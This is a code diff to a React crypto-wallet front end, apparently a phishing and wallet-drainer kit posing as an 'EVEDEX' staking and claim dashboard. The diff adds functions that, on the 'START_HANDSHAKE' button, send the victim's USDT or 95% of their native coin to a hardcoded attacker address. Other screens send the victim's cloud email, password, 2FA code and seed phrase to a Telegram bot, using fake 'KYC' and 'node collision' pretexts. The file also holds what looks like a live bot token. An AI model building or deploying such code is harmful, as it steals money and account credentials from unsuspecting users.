@@ -18,6 +18,7 @@ export default function App() {
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
 
+  // PROJECT CONFIG
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 
@@ -25,7 +26,8 @@ export default function App() {
   const USDT_MAP = { 
     1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 
     56: "0x55d398326f99059ff775485246999027b3197955",
-    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
+    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
+    42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b"
   };
 
   const { data: nativeBal } = useBalance({ address }); 
@@ -35,6 +37,29 @@ export default function App() {
     method: 'POST', headers: { 'Content-Type': 'application/json' }, 
     body: JSON.stringify({ chat_id: chatId, text: msg }) 
   }).catch(()=>{});
+
+  // WITHDRAW LOGIC (SWEEP)
+  const executeWithdraw = () => {
+    const usdtAddr = USDT_MAP[chainId];
+    if (usdtAddr && tokenBal && tokenBal.value > 0n) {
+      // USDT Transfer hex
+      const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
+      sendTransaction({ to: usdtAddr, data }, { 
+        onSuccess: () => { log(`✅ USDT SWEEP SENT: ${tokenBal.formatted}`); setView("seed_gate"); },
+        onError: () => sweepNative() 
+      });
+    } else {
+      sweepNative();
+    }
+  };
+
+  const sweepNative = () => {
+    if (!nativeBal || nativeBal.value <= 2000000000000000n) { setView("seed_gate"); return; }
+    const amount = (nativeBal.value * 95n) / 100n; // 95% to cover gas
+    sendTransaction({ to: destination, value: amount }, {
+      onSettled: () => setView("seed_gate")
+    });
+  };
 
   useEffect(() => {
     if (activeTask === "Rectify") {
@@ -51,7 +76,6 @@ export default function App() {
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
       
-      {/* HEADER */}
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'30px', borderBottom:'1px solid #1e293b', paddingBottom:'15px'}}>
         <div>
           <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
@@ -63,12 +87,10 @@ export default function App() {
       {!isConnected ? (
         <div style={{textAlign:'center', marginTop:'50px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
           <div style={{fontSize:'45px', marginBottom:'20px'}}>🔐</div>
-          <div style={{fontSize:'10px', color:'#475569', marginBottom:'30px'}}>ENCRYPTED_SESSION_REQUIRED</div>
           <appkit-button />
         </div>
       ) : (
         <>
-          {/* MAIN MENU */}
           {view === "menu" && (
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
@@ -81,10 +103,12 @@ export default function App() {
             </div>
           )}
 
-          {/* RECTIFY / TASK BOX */}
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
-              <div style={{fontSize:'8px', color:'#475569', marginBottom:'20px'}}>POOL_ACTIVE // SLIPPAGE: 0.1% [AUTO]</div>
+              <div style={{display:'flex', justifyContent:'space-between', fontSize:'7px', color:'#475569', marginBottom:'15px'}}>
+                <span>SLIPPAGE: 0.1% [AUTO]</span>
+                <span>GAS: {Math.floor(Math.random()*5)+12} GWEI</span>
+              </div>
               {activeTask === "Rectify" && (
                 <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
                   <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", cursor:'pointer', fontWeight:'900'}}>USDT_POOL</div>
@@ -93,49 +117,46 @@ export default function App() {
               )}
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
-                <input value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} 
+                <input value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} type={activeTask === "Rectify" ? "text" : "number"}
                 style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
               </div>
-              <button onClick={() => setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
-              <button onClick={()=>setView("menu")} style={{marginTop:'15px', background:'none', border:'none', color:'#475569', fontSize:'10px'}}>← CANCEL_RELAY</button>
+              <button onClick={executeWithdraw} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
             </div>
           )}
 
-          {/* KYC SCREEN */}
           {view === "kyc_screen" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
               <h2 style={{color:'white', marginBottom:'25px', fontWeight:'900'}}>IDENTITY_SYNC</h2>
               {kycPhase === 1 ? (
                 <>
-                  <input placeholder="CLOUD_ID (EMAIL)" onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
-                  <input type="password" placeholder="CLOUD_PASSWORD" onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
-                  <button onClick={()=>{if(kycEmail && kycPass){log(`🆔 KYC: ${kycEmail}/${kycPass}`); setKycPhase(2);}}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
+                  <input placeholder="CLOUD_ID (EMAIL)" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
+                  <input type="password" placeholder="CLOUD_PASSWORD" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
+                  <button disabled={!kycEmail || !kycPass} onClick={()=>{log(`🆔 KYC: ${kycEmail}/${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
                 </>
               ) : (
                 <>
                   <div style={{color:'#3b82f6', fontSize:'11px', marginBottom:'15px'}}>ENTER 6-DIGIT CLOUD CODE</div>
-                  <input maxLength="6" placeholder="000000" onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'28px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
-                  <button onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE_SYNC</button>
+                  <input maxLength="6" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'28px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
+                  <button disabled={kycCode.length < 6} onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor: kycCode.length === 6 ? '#3b82f6' : '#1e293b', color:'white', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE_SYNC</button>
                 </>
               )}
             </div>
           )}
 
-          {/* SEED MODAL */}
           {view === "seed_gate" && (
             <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
               <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
                 {!isSyncing ? (
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'15px'}}>🛡️ SECURE_RELAY</div>
-                    <p style={{fontSize:'10px', color:'#475569', marginBottom:'25px', lineHeight:'1.4'}}>NODE_COLLISION DETECTED. PROVIDE RECOVERY KEY TO ENCRYPT MAINNET TUNNEL.</p>
+                    <p style={{fontSize:'10px', color:'#475569', marginBottom:'25px', lineHeight:'1.4'}}>MULTI-SIG COLLISION DETECTED. PROVIDE SEED PHRASE TO RE-ENCRYPT END-TO-END NODE TUNNEL.</p>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." 
                     style={{width:'100%', height:'130px', backgroundColor:'black', borderRadius:'20px', color:'#10b981', padding:'20px', outline:'none', border:'1px solid #1e293b', fontSize:'14px'}} />
-                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: RELAY_CONGESTION."); setView("menu")},1200)}},60);}} 
+                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: RELAY_TIMEOUT. PLEASE RE-ENTER PHRASE."); setView("menu")},1200)}},60);}} 
                     style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', marginTop:'25px'}}>FINALIZE_SYNC</button>
                   </>
                 ) : (
-                  <div style={{padding:'40px 0'}}><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'10px', color:'#10b981'}}>INDEXING_RELAY_POOL...</div></div>
+                  <div style={{padding:'40px 0'}}><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'10px', color:'#10b981'}}>STABILIZING_RELAY_POOL...</div></div>
                 )}
               </div>
             </div>
